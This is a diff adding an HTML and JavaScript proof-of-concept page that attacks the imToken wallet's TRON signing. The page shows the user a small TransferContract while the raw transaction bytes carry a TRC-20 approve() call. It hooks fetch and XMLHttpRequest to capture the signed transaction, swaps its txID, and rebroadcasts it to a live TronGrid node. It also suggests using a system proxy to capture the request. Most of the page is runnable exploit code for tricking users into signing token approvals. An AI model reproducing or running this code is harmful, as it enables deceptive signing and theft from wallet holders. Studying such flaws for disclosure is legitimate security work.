@@ -1,0 +1,347 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TRON Mismatch PoC - Option A (txID swap)</title>
+    <style>
+      body { font-family: monospace; padding: 12px; font-size: 13px; background: #0d0d0d; color: #e0e0e0; }
+      h2 { color: #ff4444; margin-top: 0; font-size: 15px; }
+      label { display: block; margin: 6px 0 2px; color: #aaa; font-size: 12px; }
+      input { width: 100%; box-sizing: border-box; background: #1a1a1a; border: 1px solid #333;
+              color: #e0e0e0; padding: 4px 6px; border-radius: 3px; font-family: monospace; font-size: 12px; }
+      button { margin-top: 10px; padding: 8px 16px; background: #c00; color: #fff;
+               border: none; border-radius: 3px; cursor: pointer; font-weight: bold; }
+      button:disabled { background: #555; cursor: not-allowed; }
+      pre { background: #111; border: 1px solid #222; padding: 8px; border-radius: 4px;
+            overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 4px 0;
+            min-height: 16px; font-size: 11.5px; }
+      .section { margin-top: 12px; }
+      .tag { color: #ff9900; font-weight: bold; font-size: 11px; text-transform: uppercase; margin-bottom: 3px; }
+      .ok   { color: #44ff88; }
+      .err  { color: #ff4444; }
+      .warn { color: #ffaa00; }
+      .note { color: #555; font-size: 11px; line-height: 1.5; margin-bottom: 10px; }
+    </style>
+  </head>
+  <body>
+    <h2>TRON Mismatch PoC — Option A (txID swap bypass)</h2>
+    <p class="note">
+      Core idea: imToken re-serializes from raw_data (TransferContract) and signs txID_T.<br>
+      After interception we swap txID in the broadcast body to txID_T (what imToken signed),<br>
+      keeping raw_data_hex = approve hex. If the TRON node trusts the submitted txID field<br>
+      for signature verification instead of recomputing SHA256(raw_data_hex),<br>
+      the signature verifies (owner) and the approve executes.
+    </p>
+
+    <div>
+      <label>Preview recipient (shown to user as TransferContract target)</label>
+      <input id="previewRecipient" value="T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb" />
+      <label>Preview amount in SUN</label>
+      <input id="previewAmount" value="10000" />
+      <label>TRC-20 token contract (approve target)</label>
+      <input id="tokenContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
+      <label>Spender address (defaults to current account)</label>
+      <input id="spender" placeholder="defaults to current address" />
+      <label>Approve amount (token units)</label>
+      <input id="approveAmount" value="1" />
+      <label>RPC for building transactions</label>
+      <input id="rpcUrl" value="https://api.trongrid.io" />
+      <label>Direct broadcast endpoint (real TRON full node)</label>
+      <input id="broadcastUrl" value="https://api.trongrid.io/wallet/broadcasttransaction" />
+    </div>
+
+    <button id="runBtn">Run PoC</button>
+
+    <div class="section"><div class="tag">Status</div><pre id="status"></pre></div>
+    <div class="section"><div class="tag">What user sees — raw_data (TransferContract)</div><pre id="previewTx"></pre></div>
+    <div class="section"><div class="tag">What is actually signed — raw_data_hex (approve)</div><pre id="approveTx"></pre></div>
+    <div class="section"><div class="tag">txID analysis (imToken signed txID_T, not txID_A)</div><pre id="txidAnalysis"></pre></div>
+    <div class="section"><div class="tag">Intercepted signed tx (raw from imToken)</div><pre id="capturedTx"></pre></div>
+    <div class="section"><div class="tag">Modified tx (txID swapped to txID_T)</div><pre id="modifiedTx"></pre></div>
+    <div class="section"><div class="tag">Broadcast result — api.trongrid.io</div><pre id="broadcastResult"></pre></div>
+    <div class="section"><div class="tag">Intercept log</div><pre id="interceptLog"></pre></div>
+
+    <script>
+      const $ = (id) => document.getElementById(id);
+      function j(v) { return JSON.stringify(v, null, 2); }
+      function setStatus(msg, cls) { $('status').textContent = msg; $('status').className = cls || ''; }
+
+      function rpc() {
+        return ($('rpcUrl').value.trim() || 'https://api.trongrid.io').replace(/\/$/, '');
+      }
+
+      function getAccount() {
+        const a = window.tronWeb?.defaultAddress?.base58;
+        if (!a || !a.startsWith('T')) throw new Error('No TRON account. Open inside imToken with a TRON wallet active.');
+        return a;
+      }
+
+      async function apiPost(url, body, fetchFn) {
+        const fn = fetchFn || window.fetch.bind(window);
+        const r = await fn(url, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        if (!r.ok) { const t = await r.text().catch(() => ''); throw new Error(`HTTP ${r.status} ${url}: ${t}`); }
+        return r.json();
+      }
+
+      async function buildPreviewTransfer(from) {
+        const tx = await apiPost(`${rpc()}/wallet/createtransaction`, {
+          owner_address: from,
+          to_address: $('previewRecipient').value.trim(),
+          amount: Number($('previewAmount').value.trim()),
+          visible: true,
+        });
+        if (tx.Error) throw new Error('createtransaction: ' + tx.Error);
+        return tx;  // tx.txID = SHA256(TransferContract bytes) = txID_T
+      }
+
+      async function buildApprove(from, spender) {
+        const spenderHex = window.tronWeb.address.toHex(spender).replace(/^41/, '').padStart(64, '0');
+        const amountHex  = BigInt($('approveAmount').value.trim() || '1').toString(16).padStart(64, '0');
+        const res = await apiPost(`${rpc()}/wallet/triggersmartcontract`, {
+          owner_address: from,
+          contract_address: $('tokenContract').value.trim(),
+          function_selector: 'approve(address,uint256)',
+          parameter: spenderHex + amountHex,
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: true,
+        });
+        if (!res?.result?.result || !res?.transaction?.raw_data_hex)
+          throw new Error('triggersmartcontract failed: ' + j(res));
+        return res.transaction;  // .txID = SHA256(approve bytes) = txID_A
+      }
+
+      // Intercept fetch + XHR to capture the signed tx from tron.sendTransaction
+      async function interceptAndSign(account, mismatchedTx) {
+        const nativeFetch = window.fetch.bind(window);
+        const NativeXHR   = window.XMLHttpRequest;
+        const log = [];
+        let captured = null;
+
+        const isBroadcast = (u) => /broadcasttransaction/i.test(String(u ?? ''));
+
+        // Capture-only hook: record the signed tx but let the request proceed.
+        // This way we get the signed tx even if callPromisifyAPI eventually throws
+        // (e.g. token.im middleware returns SIGERROR — we still want the signature).
+        window.fetch = async function(input, init = {}) {
+          const url = typeof input === 'string' ? input : (input?.url ?? String(input));
+          log.push('[fetch] ' + url);
+          if (isBroadcast(url)) {
+            try {
+              const body = JSON.parse(typeof init?.body === 'string' ? init.body : '{}');
+              if (body?.signature?.length) {
+                captured = body;
+                log.push('[fetch] ✓ signed tx captured (letting original broadcast proceed)');
+              }
+            } catch (_) {}
+          }
+          return nativeFetch(input, init);
+        };
+
+        window.XMLHttpRequest = function InterceptedXHR() {
+          const xhr = new NativeXHR();
+          let _url = '';
+          const _open = NativeXHR.prototype.open.bind(xhr);
+          const _send = NativeXHR.prototype.send.bind(xhr);
+
+          xhr.open = function(m, u, ...rest) {
+            _url = u; log.push('[xhr] ' + u);
+            return _open(m, u, ...rest);
+          };
+              xhr.send = function(body) {
+            if (isBroadcast(_url)) {
+              try {
+                const parsed = JSON.parse(typeof body === 'string' ? body : '{}');
+                if (parsed?.signature?.length) {
+                  captured = parsed;
+                  log.push('[xhr] ✓ signed tx captured (letting original broadcast proceed)');
+                }
+              } catch (_) {}
+            }
+            return _send(body);
+          };
+          return xhr;
+        };
+        window.XMLHttpRequest.prototype = NativeXHR.prototype;
+
+        let callError = null;
+        try {
+          if (typeof window.imToken?.callPromisifyAPI !== 'function')
+            throw new Error('window.imToken.callPromisifyAPI not available. Must run inside imToken.');
+
+          await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+            from: account,
+            tx: mismatchedTx,
+            useTronHeader: true,
+          });
+        } catch (e) {
+          // Save error but do NOT rethrow — we may still have captured the signed tx
+          // even if the original broadcast to token.im got SIGERROR.
+          callError = e;
+          log.push('[callPromisifyAPI error] ' + e.message);
+        } finally {
+          window.fetch          = nativeFetch;
+          window.XMLHttpRequest = NativeXHR;
+        }
+
+        return { captured, log, nativeFetch, callError };
+      }
+
+      async function run() {
+        $('runBtn').disabled = true;
+        ['previewTx','approveTx','txidAnalysis','capturedTx','modifiedTx','broadcastResult','interceptLog']
+          .forEach(id => $(id).textContent = '');
+
+        try {
+          // ── 1. Build both transactions ────────────────────────────────────
+          setStatus('1/5  building transactions…');
+          const account = getAccount();
+          const spender  = $('spender').value.trim() || account;
+
+          const previewTransfer = await buildPreviewTransfer(account);
+          const approveTx       = await buildApprove(account, spender);
+
+          const txID_T = previewTransfer.txID;          // TransferContract txID (what imToken will sign)
+          const txID_A = approveTx.txID;                // approve txID
+
+          $('previewTx').textContent = j(previewTransfer.raw_data);
+
+          const approveData = approveTx.raw_data.contract[0].parameter.value.data ?? '';
+          if (approveData.slice(0, 8).toLowerCase() !== '095ea7b3')
+            throw new Error('Unexpected selector: ' + approveData.slice(0, 8));
+
+          $('approveTx').textContent = j({
+            txID_A,
+            selector:     approveData.slice(0, 8),
+            approve_data: approveData,
+            raw_data_hex: approveTx.raw_data_hex,
+          });
+
+          $('txidAnalysis').textContent = j({
+            txID_T,
+            txID_A,
+            note: [
+              'imToken re-serializes raw_data (TransferContract) → signs txID_T',
+              'We submit raw_data_hex = approve hex → txID_A',
+              'After intercept: swap submitted txID from txID_A → txID_T',
+              'Hypothesis: TRON node verifies sig against submitted txID (txID_T)',
+              '  → ecrecover(sig, txID_T) = owner → sig valid',
+              '  → executes raw_data_hex = approve',
+            ].join('\n  '),
+          });
+
+          // ── 2. Build mismatched tx ────────────────────────────────────────
+          // raw_data = TransferContract (user sees this in imToken UI)
+          // raw_data_hex = approve hex (what we want executed on-chain)
+          // txID = txID_A (approve txID) — imToken will show this but sign txID_T
+          const mismatchedTx = {
+            ...approveTx,
+            raw_data:     previewTransfer.raw_data,
+            raw_data_hex: approveTx.raw_data_hex,
+            txID:         txID_A,
+          };
+
+          // ── 3. Intercept broadcast from imToken ───────────────────────────
+          setStatus('2/5  waiting for wallet signature (imToken confirmation)…');
+          const { captured, log, nativeFetch, callError } = await interceptAndSign(account, mismatchedTx);
+          $('interceptLog').textContent = log.join('\n');
+
+          if (!captured) {
+            // No JS-level broadcast observed. imToken likely used native iOS networking.
+            // The original broadcast went to token.im middleware and may have failed.
+            const reason = callError ? `\nimToken error: ${callError.message}` : '';
+            throw new Error(
+              'Signed tx NOT captured via JS fetch/XHR. imToken broadcast natively (iOS NSURLSession).' + reason + '\n\n' +
+              'To proceed: capture the POST body to broadcasttransaction via a system-level proxy,\n' +
+              'then change txID to txID_T and replay to api.trongrid.io.'
+            );
+          }
+
+          if (callError) {
+            // We have the signed tx, but the original broadcast (to token.im) got an error.
+            // This is expected — we will re-broadcast to api.trongrid.io with the swapped txID.
+            $('interceptLog').textContent += '\n[note] original broadcast failed (' + callError.message.slice(0, 120) + ') — proceeding with txID swap to direct node';
+          }
+
+          $('capturedTx').textContent = j({
+            txID_in_captured:  captured.txID,
+            signature:         captured.signature,
+            raw_data_hex_head: (captured.raw_data_hex ?? '').slice(0, 64) + '…',
+            note: 'signature is over txID_T (TransferContract), NOT txID_A (approve)',
+          });
+
+          // ── 4. txID swap: replace txID_A with txID_T ─────────────────────
+          // Keep raw_data_hex = approve hex (what we want executed)
+          // Keep signature from imToken (over txID_T)
+          // Change txID to txID_T (what imToken actually signed)
+          const modifiedTx = {
+            ...captured,
+            txID: txID_T,
+          };
+
+          $('modifiedTx').textContent = j({
+            txID:        modifiedTx.txID,
+            raw_data_hex_head: (modifiedTx.raw_data_hex ?? '').slice(0, 64) + '…',
+            signature:   modifiedTx.signature,
+            hypothesis:  'If node verifies sig against submitted txID (txID_T) → owner matches → approve executes',
+          });
+
+          // ── 5. Broadcast modified tx directly to TRON full node ───────────
+          setStatus('3/5  broadcasting modified tx (txID swapped) to TRON node…');
+          const broadcastUrl = $('broadcastUrl').value.trim();
+          const result = await apiPost(broadcastUrl, modifiedTx, nativeFetch);
+          $('broadcastResult').textContent = j(result);
+
+          if (result.result === true) {
+            setStatus(
+              [
+                '✓ SUCCESS — txID swap bypass confirmed.',
+                '',
+                'User saw in wallet:  TransferContract (raw_data)',
+                'Executed on-chain:   approve() (raw_data_hex)',
+                '',
+                'TRON node accepted signature verified against submitted txID (txID_T)',
+                'instead of recomputing SHA256(raw_data_hex) = txID_A.',
+                '',
+                'approve txID (what node recorded): ' + modifiedTx.txID,
+                'spender: ' + spender,
+                'token:   ' + $('tokenContract').value.trim(),
+                'amount:  ' + $('approveAmount').value.trim(),
+              ].join('\n'),
+              'ok'
+            );
+          } else {
+            // Parse SIGERROR to check if node used txID_T or txID_A for verification
+            const msg = result.message ?? result.code ?? j(result);
+            const usedTxID_T = !msg.includes('TCBTwNiv') && msg.includes('SIGERROR');
+            setStatus(
+              [
+                'Broadcast failed:',
+                msg,
+                '',
+                usedTxID_T
+                  ? '→ Node appears to use submitted txID (txID_T) but signature still invalid.'
+                  : '→ Node recomputed SHA256(raw_data_hex) = txID_A and verified against that.',
+                '  SIGERROR with same garbage address = node recomputes (no bypass possible via txID field).',
+              ].join('\n'),
+              'err'
+            );
+          }
+
+        } catch (e) {
+          console.error(e);
+          setStatus('Error: ' + (e.message || String(e)), 'err');
+        } finally {
+          $('runBtn').disabled = false;
+        }
+      }
+
+      $('runBtn').addEventListener('click', run);
+    </script>
+  </body>
+</html>
